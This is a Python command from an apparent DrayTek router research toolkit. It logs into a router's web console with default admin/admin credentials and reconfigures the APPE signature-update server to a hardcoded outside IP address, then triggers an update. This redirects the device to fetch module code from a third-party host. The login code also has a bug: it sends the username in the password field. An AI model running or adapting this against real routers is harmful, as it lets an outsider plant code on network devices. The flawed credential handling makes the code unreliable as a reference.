import requests
from draytek_arsenal.commands.base import Command
from typing import Any, Dict, List
from base64 import b64encode

class TriggerAppeUpdateCommand(Command):

    @staticmethod
    def name() -> str:
        return "trigger_appe_update"

    @staticmethod
    def description() -> str:
        return "Trigger an update of the appe module"

    @staticmethod
    def args() -> List[Dict[str, Any]]:
        return [
            {"flags": ["ip"], "kwargs": {"type": str, "help": "IP of the router"}},
            {
                "flags": ["--user"],
                "kwargs": {"type": str, "help": "User of the web console", "default": "admin"}
            },
            {
                "flags": ["--pass"],
                "kwargs": {"type": str, "help": "Password of the web console", "default": "admin"}
            }
        ]

    
    @staticmethod
    def execute(args):
        base_url = f"http://{args.ip}/"

        print("[*] Login to the router web interface")

        # Log to get cookies and auth_str
        url = base_url + "cgi-bin/wlogin.cgi"
        data = {
            "aa": b64encode(args.user.encode()),
            "ab": b64encode(args.user.encode()),
            "sFormAuthStr": "authstr"
        }

        resp = requests.post(url, data=data, allow_redirects=False)

        if resp.ok:
            print("[+] Login success")

        else:
            print("[x] Error on login, check credentials")
            return

        # Send the file
        router_url = base_url + 'cgi-bin/appeprof.cgi'
        auth_str = 'authstr'

        data = {
            "sltInterface": 1,
            "sAppeDownSrv": "104.248.120.60",
            "sWebAppedownMsg": "",
            "iSchedUpdate": 1,
            "sltHour_every": 1,
            "sltMin_every": 0,
            "sltHour_Daily": 0,
            "sltMin_Daily": 0,
            "iSchedUpMode": 2,
            "sltDay_Weekly": 4,
            "sltHour_Weekly": 9,
            "sltMin_Weekly": 1,
            "iAct": 3,
            "sProfileAct": "signatureup",
            "webchange": 0,
            "sFormAuthStr": auth_str
        }

        session_cookie = resp.cookies['SESSION_ID_VIGOR']

        cookies = {'SESSION_ID_VIGOR': session_cookie}
        res = requests.post(router_url, cookies = cookies, data=data)

        if res.ok:
            print(f"[+] Appe update successfully triggered")

        else:
            print("[x] Received an error response")
            print(res.text)
